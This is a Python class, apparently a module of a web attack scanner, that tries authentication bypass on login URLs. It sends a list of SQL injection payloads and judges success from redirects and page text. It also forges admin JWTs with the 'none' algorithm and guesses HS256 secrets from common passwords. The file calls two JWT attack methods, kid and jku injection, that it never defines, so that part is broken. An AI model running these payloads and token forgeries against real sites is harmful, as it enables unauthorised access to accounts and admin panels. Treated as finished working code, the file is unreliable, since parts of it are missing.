import json
import base64
import jwt
import hashlib
import logging

class AuthBypass:
    def __init__(self, session, findings=None, web_mode=False):
        self.session = session
        self.findings = findings if findings else {'auth_bypass': []}
        self.logger = logging.getLogger(__name__)
        self.web_mode = web_mode  # Skip heavy testing in web mode
        
    def test_all(self, urls):
        # In web mode, only test URLs with 'login' or 'auth' and skip most testing
        if self.web_mode:
            login_urls = [url for url in urls if 'login' in url.lower() or 'auth' in url.lower()]
            # Quick test only - don't test all combinations
            for url in login_urls[:1]:  # Only test 1 login URL max
                result = self.sql_auth_bypass(url)
                if result:
                    self.findings['auth_bypass'].append(f"SQL Injection Auth Bypass: {result}")
            return
        
        # Full testing in normal mode
        login_urls = [url for url in urls if 'login' in url.lower() or 'auth' in url.lower()]
        
        for url in login_urls:
            self.logger.info(f"Testing authentication bypass on {url}")
            
            # Test SQL injection auth bypass
            result = self.sql_auth_bypass(url)
            if result:
                self.logger.critical(f"SQL Auth Bypass SUCCESS: {result}")
                self.findings['auth_bypass'].append(f"SQL Injection Auth Bypass at {url}: {result}")
            
            # Test JWT bypass if token found
            result = self.detect_and_bypass_jwt(url)
            if result:
                self.logger.critical(f"JWT Bypass SUCCESS: {result}")
                self.findings['auth_bypass'].append(f"JWT Bypass at {url}: {result}")
    
    def sql_auth_bypass(self, login_url):
        payloads = [
            ("' OR '1'='1'--", "anything"),
            ("admin'--", ""),
            ("' OR 1=1--", "password"),
            ("admin", "' OR '1'='1"),
            ("' UNION SELECT 'admin','hashed_password'--", ""),
            ("' OR 'a'='a", "' OR 'a'='a"),
            ("'=0--", ""),
            ("\" OR \"\"=\"", "\" OR \"\"=\""),
            ("') OR ('1'='1", ""),
            ("1' OR '1' = '1", "1")
        ]
        
        for username, password in payloads:
            data = {
                'username': username,
                'password': password,
                'email': username,
                'user': username,
                'login': username,
                'pass': password,
                'pwd': password
            }
            
            try:
                response = self.session.post(login_url, data=data, allow_redirects=False, timeout=10)
                
                # Check for successful bypass indicators
                if response.status_code in [302, 301]:  # Redirect after login
                    location = response.headers.get('Location', '')
                    if 'dashboard' in location or 'admin' in location or 'home' in location or 'user' in location:
                        self.logger.critical(f"SQL Auth Bypass SUCCESS: {username}")
                        return f"Payload: username={username}, password={password}"
                
                if response.status_code == 200:
                    success_indicators = [
                        'welcome', 'dashboard', 'logout', 'my account', 'logged in',
                        'successfully', 'admin panel', 'user portal', 'please log out'
                    ]
                    
                    response_lower = response.text.lower()
                    for indicator in success_indicators:
                        if indicator in response_lower:
                            self.logger.critical(f"SQL Auth Bypass SUCCESS: {username}")
                            return f"Payload: username={username}, password={password}"
                
                # Check for SQL error messages (indicates SQL injection is working)
                sql_errors = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'postgresql',
                    'sqlite', 'sql server', 'odbc', 'jdbc', 'syntax error',
                    'unexpected', 'mysql_num_rows'
                ]
                
                for error in sql_errors:
                    if error in response.text.lower():
                        self.logger.critical(f"SQL INJECTION VULNERABILITY: {login_url} - Error-based SQLi detected with payload")
                        if 'auth_injection' not in self.findings:
                            self.findings['auth_injection'] = []
                        self.findings['auth_injection'].append(f"SQL Injection in authentication at {login_url}")
                            
            except Exception as e:
                self.logger.debug(f"Error testing {login_url}: {e}")
        
        return None
    
    def detect_and_bypass_jwt(self, url):
        # Extract JWT tokens from cookies
        cookies = self.session.cookies.get_dict()
        
        for cookie_name, cookie_value in cookies.items():
            if self._is_jwt(cookie_value):
                self.logger.info(f"Found JWT token in cookie: {cookie_name}")
                
                # Try various JWT attacks
                attacks = [
                    self._jwt_none_algorithm,
                    self._jwt_hs256_bruteforce,
                    self._jwt_kid_injection,
                    self._jwt_jku_injection
                ]
                
                for attack_func in attacks:
                    result = attack_func(cookie_value)
                    if result:
                        return result
        
        return None
    
    def _is_jwt(self, token):
        """Check if string is a JWT token"""
        parts = token.split('.')
        return len(parts) == 3 and all(len(part) > 0 for part in parts)
    
    def _jwt_none_algorithm(self, token):
        """Try JWT 'none' algorithm attack"""
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # Modify payload to be admin
            decoded['admin'] = True
            decoded['role'] = 'admin'
            decoded['is_admin'] = True
            
            # Re-encode with 'none' algorithm
            headers = {"alg": "none", "typ": "JWT"}
            forged_token = jwt.encode(
                decoded, 
                key="", 
                algorithm="none",
                headers=headers
            )
            
            return f"JWT None Algorithm Bypass: {forged_token}"
            
        except Exception as e:
            return None
    
    def _jwt_hs256_bruteforce(self, token):
        """Brute force HS256 secret"""
        common_secrets = [
            'secret', 'password', 'admin', '123456', 'qwerty',
            'letmein', 'welcome', 'monkey', 'password123'
        ]
        
        try:
            for secret in common_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=['HS256'])
                    return f"JWT Secret Found: '{secret}'"
                except jwt.InvalidSignatureError:
                    continue
        except:
            pass
        
        return None
